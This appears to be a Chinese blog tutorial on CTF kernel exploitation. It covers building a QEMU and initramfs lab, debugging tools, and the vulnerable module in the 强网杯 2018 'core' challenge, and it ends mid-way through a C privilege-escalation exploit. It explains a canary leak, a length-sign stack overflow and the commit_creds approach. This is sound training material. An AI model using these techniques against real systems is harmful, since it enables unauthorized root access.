<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-system-x86</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#run.sh</span></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 earlyprintk=serial debug panic=0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;/mnt/e/ctf/kernel/linux-5.15.153/arch/x86/boot/bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>然而一跑直接报错，执行不了/init。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114004241555.png"
                      class=""
                >
<p>这里搞了半天，甚至拿正常题目给的cpio文件系统能够进入内核正确执行。最后发现问题所在，是因为我们用系统自带的包管理器下载的busybox是动态编译的，所以在我们虚拟的环境里，没有配置动态链接库，也就执行不了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114145451508.png"
                      class=""
                >
<p>那么我们可以从<a class="link" 
 href="https://busybox.net/" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载源码，然后自己指定静态编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-01-14-000023.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后就能在项目根目录获取到一个静态编译的busybox，把这个busybox扔到我们待打包成文件系统的bin目录下。之后就能正常运行了。有了busybox，我们就可以把一些常用指令都扔去。这里可以写个脚本，把busybox支持的所有指令都给放到bin目录下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> initramfs/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
<p>然后对文件系统进行打包，解压。最后run一下看看能不能正常启动。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">gunzip initramfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151349527.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151546880.png"
                      class=""
                >
<p>现在已经能启动了，不过tty出现了问题，但不影响我们对内核的模块进行测试。然后我们就可以把之前编译好的<strong>myko.ko</strong>扔到虚拟的文件系统里，重新打包一次并运行。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> myko.ko ./initramfs/myko.ko</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">find . | cpio -o --format=newc  &gt; ../initramfs.cpio</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以装载模块，出现Hello，world！说明正确导入了内核的扩展模块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114153803147.png"
                      class=""
                >
<h5 id="题目提供环境">题目提供环境</h5>
<p>一般kernel pwn题会给出以下几种类型的文件。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">xxx.sh		<span class="comment">//启动脚本</span></span><br><span class="line">bzImage		<span class="comment">//内核脚本</span></span><br><span class="line">xxx.cpio	<span class="comment">//文件系统</span></span><br><span class="line">xxx.ko		<span class="comment">//内核模块文件，相当于用户模式的.so动态链接库</span></span><br></pre></td></tr></table></figure></div>
<p><strong>内核镜像分类</strong></p>
<ul>
<li>vmlinux：原始内核文件</li>
</ul>
<p>在当前目录下提取到 vmlinux ，为编译出来的原始内核文件。</p>
<ul>
<li>bzImage：压缩内核镜像</li>
</ul>
<p>在当前目录下的 arch/x86/boot/ 目录下提取到 bzImage
，为压缩后的内核文件，适用于大内核。</p>
<ul>
<li>zImage &amp;&amp; bzImage</li>
</ul>
<p>zImage 是 vmlinux 经过gzip压缩后的文件。bzImage 中的 bz 表示“big
zImage”。bzImage 不是用 bzip2 压缩，而是要偏移到一个位置，使用 gzip
压缩。两者的不同之处在于，zImage 解压缩内核到低端内存(第一个
640K)，bzImage 解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用
zImage 或 bzImage 都行，如果比较大应该用 bzImage 。</p>
<p>其中我们来看看<code>xxx.sh</code>分析一下启动的过程。</p>
<p>如在<strong>DSBCTF-EasyKernel</strong>这个题中，其提供了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111221325011.png"
                      class=""
                >
<p>run.sh中的内容如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>-cpu kvm64</strong></p>
<p>指定虚拟机的 CPU 类型为 <code>kvm64</code>。kvm64是 QEMU
提供的一个优化 CPU 类型，它专为 KVM 提供虚拟化支持。如果运行环境支持
KVM，则可以获得硬件加速。此选项对需要模拟 CPU 特性的程序（如针对 CPU
指令的漏洞开发）特别有用。</p>
<p><strong>-m 256</strong></p>
<p>设置虚拟机内存大小为 <strong>256
MB</strong>。可以根据需要调整这个数值来分配更多或更少的内存。</p>
<p><strong>-nographic</strong></p>
<p>让虚拟机运行在无图形模式（纯终端模式）。禁用图形输出窗口（例如 VGA
显示），仅使用标准输入输出（例如通过 <code>ttyS0</code> 访问）。</p>
<p><strong>-kernel "bzImage"</strong></p>
<p>指定要加载的 Linux 内核文件，通常是已编译好的 <code>bzImage</code>
文件。<strong><code>bzImage</code></strong> 是 Linux
内核的可引导压缩映像。</p>
<p><strong>-append "console=ttyS0 panic=-1 pti=off kaslr
quiet"</strong></p>
<p>向内核传递启动参数：</p>
<ol type="1">
<li><code>console=ttyS0</code>
<ul>
<li>将内核的输出和输入重定向到串行端口
<code>ttyS0</code>（第一个串行设备）。</li>
<li>这通常与 <code>-nographic</code> 一起使用。</li>
</ul></li>
<li><code>panic=-1</code>
<ul>
<li>如果内核遇到致命错误（panic），虚拟机会无限期地等待，不会自动重启。</li>
</ul></li>
<li><code>pti=off</code>
<ul>
<li>关闭 Page Table Isolation（PTI）。PTI 是一个用于缓解 Meltdown
漏洞的安全措施，但会影响性能。</li>
</ul></li>
<li><code>kaslr</code>
<ul>
<li>随机化内核地址空间布局（Kernel Address Space Layout
Randomization）。</li>
<li>没有 <code>off</code>
说明功能是启用状态；在调试中可以关闭此功能。</li>
</ul></li>
<li><code>quiet</code>
<ul>
<li>启动时减少输出的日志信息，显示更简洁的控制台内容。</li>
</ul></li>
</ol>
<p><strong>-monitor /dev/null</strong></p>
<p>将 QEMU 的管理控制台（Monitor）的输入输出重定向到
<code>/dev/null</code>。QEMU
默认提供一个监控终端，用于控制虚拟机，这里通过设置为
<code>/dev/null</code> 禁用了该功能。</p>
<p><strong>-initrd "./rootfs.cpio"</strong></p>
<p>指定初始 RAM 磁盘（Initial RAM Disk），用 <code>./rootfs.cpio</code>
文件作为虚拟机的初始根文件系统。<strong><code>rootfs.cpio</code></strong>
是一个打包的 CPIO
格式文件系统，虚拟机启动时会加载并挂载它为根文件系统。</p>
<p><strong>-net user</strong></p>
<p>启用用户模式网络（User Networking）。提供简单的 NAT
网络环境，不需要额外配置主机的网络。</p>
<p><strong>-net nic</strong></p>
<p>创建一个虚拟网络接口卡（NIC，Network Interface
Card），用作虚拟机的网络设备。</p>
<p>然后我们要对文件系统进行解压，之后就能在当前目录下得到整个文件系统结构。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224302985.png"
                      class=""
                >
<p>之后我们直接<code>./run.sh</code>跑一下，发现已经能够运行起来了，但是由于是本地的环境，所以flag还要我们自己手动设置一下。可以在root目录下自己手动创建一个ctfshow_flag，然后再打包回去文件系统。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224440566.png"
                      class=""
                >
<p>我们再仔细看看刚刚解压出的在根目录下的内容。其中有ctfshow.ko，也就是我们重点分析的漏洞存在的扩展模块。还有init文件，该文件是linux启动时的初始化文件，包含一些重要信息，而且可以修改该文件的一些内容来方便调试。我们来看看这道题的init里是什么内容。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /                                                                                  </span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">export</span> PATH=/bin</span><br><span class="line"><span class="built_in">export</span> PATH=/sbin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -m 0755 /dev</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> /tmp</span><br><span class="line">[ -d /run ] || <span class="built_in">mkdir</span> /run</span><br><span class="line">[ -d /etc ] || <span class="built_in">mkdir</span> /etc</span><br><span class="line">[ -d /home ] || <span class="built_in">mkdir</span> /home</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/passwd</span><br><span class="line"><span class="built_in">chmod</span> 644 /etc/group</span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chown</span> 0:0 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /root/ctfshow_flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> ctfshow:ctfshow -R /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 777 /home/ctfshow</span><br><span class="line"><span class="built_in">chmod</span> 755 /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,nosuid proc /proc</span><br><span class="line"><span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || <span class="literal">true</span></span><br><span class="line">mount -t tmpfs -o <span class="string">&quot;noexec,nosuid,size=10%,mode=0755&quot;</span> tmpfs /run</span><br><span class="line"></span><br><span class="line">insmod ctfshow.ko</span><br><span class="line"><span class="built_in">chmod</span> o+rw /dev/kqueue</span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/ping</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exec</span> 0&lt;/dev/console) 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">    <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /sbin/init <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>从该文件中我们能看出很多重要信息：</p>
<ul>
<li>flag的权限被设置为了只有root权限可读。</li>
<li>启用了kptr_restrict，perf_event_paranoid，dmesg_restrict的内核保护机制。</li>
<li>对 <code>/bin/ping</code> 设置了 SUID
属性，普通用户运行它时会临时具有 root
权限。如果该二进制文件可以被替换或加载动态链接库，则可能借此实现提权。</li>
<li>存在<code>/dev/kqueue</code>这个设备驱动模块，可能是漏洞利用的关键。</li>
</ul>
<h4 id="工具安装">工具安装</h4>
<h5 id="vmlinux-to-elf">vmlinux-to-elf</h5>
<p>此工具允许从 vmlinux/vmlinuz/bzImage/zImage 内核映像获取完全可分析的
.ELF 文件，其中包含恢复的函数和变量符号。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line"><span class="built_in">sudo</span> pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>
<h5 id="ropper">ropper</h5>
<p>用于获取gadget，比ropgadget快。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure></div>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用，将结果存在g1文件里</span></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
<h5 id="extract-vmlinux">extract-vmlinux</h5>
<p>能够从bzImage等提取出vmlinux。这个脚本在我们编译出的内核源码的scripts目录下。</p>
<p><strong>使用方式</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
<h4 id="gdb调试">gdb调试</h4>
<p>获取内核特定符号地址</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114201804986.png"
                      class=""
                >
<p>获取驱动加载基地址，又有不同的方式。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line">grep module_name /proc/modules</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114202256392.png"
                      class=""
                >
<p>首先需要对 run.sh 做如下修改：</p>
<ul>
<li>添加 nokaslr 关闭地址随机化（不一定需要）。</li>
<li>添加 -s，因为 qemu
其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev
来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU
同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个
gdbserver。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 256 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off nokaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic    \</span><br><span class="line">    -s</span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以在启动qemu后，然后gdb远程连接到gdbserver进行调试。<code>-q</code>指定安静模式，<code>-ex</code>为启动gdb后立即执行指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb -q -ex <span class="string">&quot;target remote localhost:1234&quot;</span> </span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114203048016.png"
                      class=""
                >
<p>在启动内核后，我们可以使用 <code>add-symbol-file</code>
来添加符号信息，比如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure></div>
<h4 id="基础利用手法">基础利用手法</h4>
<h5 id="kernel-rop">kernel ROP</h5>
<h4 id="题目复现">题目复现</h4>
<h5 id="强网杯-2018---core">强网杯 2018 - core</h5>
<p>首先我们解压文件系统，这里发现给出的<strong>core.cpio</strong>，但其类型是gzip压缩，所以我们要先用gunzip解压一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117004743103.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> core.cpio ./core.cpio.gz</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpio</span><br></pre></td></tr></table></figure></div>
<p>题目给出了<strong>gen_cpio.sh</strong>，这个是用来重新打包文件系统的，以便我们修改init。其会把当前目录下所有内容打包，压缩并输出到我们命令行提供第一个参数所指定的目录处。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>
<p>start.sh以及init文件的内容如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后我们尝试启动内核，但是会卡在启动界面，经过调试，我们把start.sh中的内存指派64M改为128M，就能够正常进入内核环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117005845709.png"
                      class=""
                >
<p>然后我们仔细看看init里面的内容，发现存在2分钟定时关闭，而且启动的shell是普通用户的shell(uid为1000)，并且禁用了dmesg的内核日志查看以及直接<code>cat /proc/kallsyms</code>获取符号位置。但这道题的init中还是贴心的先把<code>/proc/kallsyms</code>迁移到了<code>/tmp/kallsyms</code>，那么其实我们还是能查看符号的偏移位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010622321.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010705905.png"
                      class=""
                >
<p>为了后续调试方便，我们可以修改init文件并重新对文件系统进行打包。对init改动处有两点，首先把poweroff的部分都注释掉，然后把<code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>中的1000改成0，从而去除了关机以及以root权限启动shell。之后重新打包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./gen_cpio.sh ./mycore.cpio.gz</span><br><span class="line">gunzip mycore.cpio.gz</span><br><span class="line">cpio -idmv &lt; mycore.cpio</span><br></pre></td></tr></table></figure></div>
<p>之后在<strong>start.sh</strong>中把<strong>core.cpio</strong>改为<strong>mycore.cpio</strong>即可，之后启动就不会自动关机，且权限为root了。</p>
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了<strong>/proc/core</strong>，<strong>exit_core</strong>删除了<strong>/proc/core</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144829081.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144951857.png"
                      class=""
                >
<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145051360.png"
                      class=""
                >
<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64
个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量
<code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code>
来 将canary
和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145312844.png"
                      class=""
                >
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code>
中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是
<code>unsigned __int16</code>，但传递的长度是
<code>signed __int64</code>，因此如果控制传入的长度为
<code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145441269.png"
                      class=""
                >
<p><strong>core_write()</strong> 向全局变量 <code>name</code>
上写，这样通过 <code>core_write()</code> 和
<code>core_copy_func()</code> 就可以控制 ropchain 了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145616435.png"
                      class=""
                >
<p>由于是第一次接触kernel
pwn的exp编写，我这里直接拿exp来进行分析学习。这里先解释一下我们exp的目的，就是提权，像什么system("/bin/sh")，我们的exp实际可以直接调用，但是拿到的只是uid=1000的普通用户的权限。我们希望通过一系列内核漏洞的利用，最终能提高权限。而且内核漏洞的exp一般都是用c语言编写的，而不是之前所学pwn用python写exp脚本。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), 